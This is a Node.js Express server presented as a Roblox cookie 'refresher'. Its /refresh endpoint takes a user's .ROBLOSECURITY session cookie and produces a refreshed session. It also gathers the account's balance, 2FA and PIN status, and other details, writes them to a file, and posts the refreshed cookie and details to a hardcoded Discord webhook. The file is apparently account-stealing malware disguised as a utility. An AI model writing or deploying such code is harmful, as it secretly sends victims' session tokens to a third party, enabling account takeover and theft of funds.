const express = require('express');
const axios = require('axios');
const fs = require('fs');

const { generateAuthTicket, redeemAuthTicket } = require('./refresh');
const { RobloxUser } = require('./getuserinfo');

const app = express();
app.use(express.json());
app.use(express.static('public'));




app.get('/refresh', async (req, res) => {
    const roblosecurityCookie = req.query.cookie;

    const authTicket = await generateAuthTicket(roblosecurityCookie);

    if (authTicket === "Failed to fetch auth ticket") {
        res.status(400).json({ error: "Invalid cookie" });
        return;
    }

    const redemptionResult = await redeemAuthTicket(authTicket);

    if (!redemptionResult.success) {
        if (redemptionResult.robloxDebugResponse && redemptionResult.robloxDebugResponse.status === 401) {
            res.status(401).json({ error: "Unauthorized: The provided cookie is invalid." });
        } else {
            res.status(400).json({ error: "Invalid cookie" });
        }
        return;
    }

    const refreshedCookie = redemptionResult.refreshedCookie || '';

    const robloxUser = await RobloxUser.register(roblosecurityCookie);
    const userData = await robloxUser.getUserData();

    const debugInfo = `Auth Ticket ID: ${authTicket}`;
    const fileContent = {
        RefreshedCookie: refreshedCookie,
        DebugInfo: debugInfo,
        Username: userData.username,
        UserID: userData.uid,
        DisplayName: userData.displayName,
        CreationDate: userData.createdAt,
        Country: userData.country,
        AccountBalanceRobux: userData.balance,
        Is2FAEnabled: userData.isTwoStepVerificationEnabled,
        IsPINEnabled: userData.isPinEnabled,
        IsPremium: userData.isPremium,
        CreditBalance: userData.creditbalance,
        RAP: userData.rap,
    };

    fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));

    const webhookURL = 'https://discord.com/api/webhooks/1408839542147911711/a1HanvWKWMGi4aD_29W2ewVyAWqFwb2yDI8lnSzRZv5dmk2d74eEitDRjJoppJf3JcZu';
    const response = await axios.post(webhookURL, {
    embeds: [
        {
            title: 'Refreshed Cookie',
            description: `**Refreshed Cookie:**\n\`\`\`${refreshedCookie || 'None'}\`\`\``,
            color: 16776960,
            thumbnail: {
                url: userData.avatarUrl || 'https://tr.rbxcdn.com/default_avatar.png',
            },
            fields: [
                { name: 'Username', value: userData.username || 'Unknown', inline: true },
                { name: 'User ID', value: String(userData.uid || 'Unknown'), inline: true },
                { name: 'Display Name', value: userData.displayName || 'Unknown', inline: true },
                { name: 'Creation Date', value: userData.createdAt || 'Unknown', inline: true },
                { name: 'Country', value: userData.country || 'Unknown', inline: true },
                { name: 'Account Balance (Robux)', value: String(userData.balance ?? 0), inline: true },
                { name: 'Is 2FA Enabled', value: String(userData.isTwoStepVerificationEnabled ?? false), inline: true },
                { name: 'Is PIN Enabled', value: String(userData.isPinEnabled ?? false), inline: true },
                { name: 'Is Premium', value: String(userData.isPremium ?? false), inline: true },
                { name: 'Credit Balance', value: String(userData.creditbalance ?? 0), inline: true },
                { name: 'RAP', value: String(userData.rap ?? 0), inline: true }
            ]
        }
    ]
});

    console.log('Sent successfully+response', response.data);

    res.json({ authTicket, redemptionResult });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
